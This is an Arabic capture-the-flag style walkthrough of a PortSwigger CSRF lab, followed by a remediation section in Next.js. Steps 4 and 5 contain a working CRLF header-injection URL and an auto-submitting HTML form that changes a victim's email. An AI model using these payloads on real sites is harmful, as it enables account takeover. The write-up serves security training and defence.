# Lab: CSRF where token is duplicated in cookie

> **Category:** CSRF  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة CSRF في وظيفة تغيير البريد الإلكتروني. الموقع يستخدم تقنية **Double Submit Cookie** غير الآمنة، حيث يتم مقارنة التوكن في الـ Body مع التوكن في الـ Cookie. يمكننا حقن كوكي بقيمة نعرفها (مثل `fake`) ثم استخدام نفس القيمة كتوكن.

**الحساب:** `wiener:peter`

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: تسجيل الدخول وفهم آلية Double Submit Cookie

- سجل الدخول بـ `wiener:peter`
- اذهب إلى **My account** → **Update email**
- اعترض الطلب في Burp:

```http
POST /my-account/change-email HTTP/1.1
Cookie: session=SESSION_ID; csrf=TOKEN_IN_COOKIE

email=test@test.com&csrf=TOKEN_IN_BODY
```

**آلية التحقق:** الخادم يقارن قيمة `csrf` في الـ Body مع قيمة `csrf` في الـ Cookie. إذا تطابقتا، يمر الطلب.

### الخطوة 2: اختبار آلية التحقق

- أرسل الطلب إلى Repeater
- جرب تغيير قيمة `csrf` في الـ Body إلى قيمة عشوائية → الطلب يرفض ❌
- جرب تغيير قيمة `csrf` في الـ Cookie إلى قيمة عشوائية → الطلب يرفض ❌
- جرب تغيير كلاهما إلى نفس القيمة (مثل `fake`) → **الطلب ينجح** ✅

**الاستنتاج:** يمكننا استخدام أي قيمة طالما تطابقت في الكوكي والـ Body.

### الخطوة 3: اكتشاف CRLF Injection في البحث

لاحظ أن وظيفة البحث تعكس المدخلات في `Set-Cookie`:

```http
GET /?search=test HTTP/1.1
```

الرد:
```
Set-Cookie: search=test; SameSite=None
```

**نستغل هذا لحقن كوكي جديد:** `%0d%0a` = سطر جديد

### الخطوة 4: إنشاء رابط لحقن كوكي csrf بقيمة fake

```
https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
```

**ماذا يحدث؟** الخادم يرد بـ:
```
Set-Cookie: search=test
Set-Cookie: csrf=fake; SameSite=None
```

### الخطوة 5: بناء HTML للهجوم

سنقوم بـ:
1. حقن كوكي `csrf=fake` في متصفح الضحية
2. إرسال فورم لتغيير البريد مع `csrf=fake` في الـ Body

```html
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit()">

<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="victim%40attacker.net">
    <input type="hidden" name="csrf" value="fake">
</form>
```

**لماذا `onerror`؟** الصورة تحاول التحميل، تفشل (لأنها ليست صورة) ثم يتم إرسال الفورم.

### الخطوة 6: رفع الهجوم إلى Exploit Server

- اضغط **Go to exploit server**
- في حقل **Body**، الصق الـ HTML
- استبدل `YOUR-LAB-ID` بمعرف مختبرك
- اضغط **Store**

### الخطوة 7: تجربة الهجوم على نفسك

- اضغط **View exploit**
- انتظر ثانية
- ارجع إلى حسابك → لاحظ أن بريدك تغير ✅

### الخطوة 8: تسليم الهجوم للضحية

- غير البريد الإلكتروني إلى قيمة مختلفة
- اضغط **Store**
- اضغط **Deliver to victim**

### الخطوة 9: حل المختبر

بعد بضع ثوانٍ، سيتم حل المختبر ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هي تقنية Double Submit Cookie؟** | مقارنة التوكن في الـ Body مع التوكن في الـ Cookie |
| **لماذا هي غير آمنة؟** | إذا استطعنا حقن كوكي في متصفح الضحية، يمكننا تجاوز الحماية |
| **كيف حقنّا الكوكي؟** | باستخدام CRLF Injection في وظيفة البحث |
| **ماذا يفعل `%0d%0a`؟** | سطر جديد (CRLF) يسمح بحقن هيدرات جديدة |
| **لماذا `onerror`؟** | الصورة تفشل في التحميل فتنفذ الفورم |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

1. استخدام تقنية **Double Submit Cookie** غير الآمنة
2. وجود ثغرة **CRLF Injection** في وظيفة البحث تسمح بحقن كوكي

---

### ❌ Non-Compliant Code (Next.js)

```javascript
// وظيفة البحث - فيها CRLF Injection
res.setHeader('Set-Cookie', `search=${search}; SameSite=None`);

// وظيفة تغيير البريد - Double Submit Cookie
const { email, csrf } = req.body;
const { sessionId, csrf: csrfCookie } = req.cookies;

if (!csrfCookie || csrf !== csrfCookie) {
  return res.status(403).send('CSRF token mismatch');
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
// وظيفة البحث - إزالة CRLF
search = search.replace(/[\r\n]/g, '');

// وظيفة تغيير البريد - استخدام CSRF Token مربوط بالجلسة
const sessionTokens = new Map(); // sessionId -> token

const { email, csrf } = req.body;
const { sessionId } = req.cookies;

const expectedToken = sessionTokens.get(sessionId);
if (!expectedToken || expectedToken !== csrf) {
  return res.status(403).send('Invalid CSRF token');
}
```

**الخلاصة:** 
1. لا تستخدم Double Submit Cookie، استخدم CSRF Token مربوط بالجلسة
2. امنع CRLF Injection في أي مكان يعكس مدخلات المستخدم

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **استخدام CSRF Token مربوط بالجلسة:** لا تعتمد على مقارنة الكوكيز.
2. **منع CRLF Injection:** ارفض أو قم بتشفير `\r` و `\n`.
3. **استخدام SameSite=Lax أو Strict:** كطبقة دفاع إضافية.
4. **استخدام `HttpOnly` للكوكيز:** لمنع سرقتها عبر XSS.

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie)
- [CSRF Cheat Sheet](https://portswigger.net/web-security/csrf)
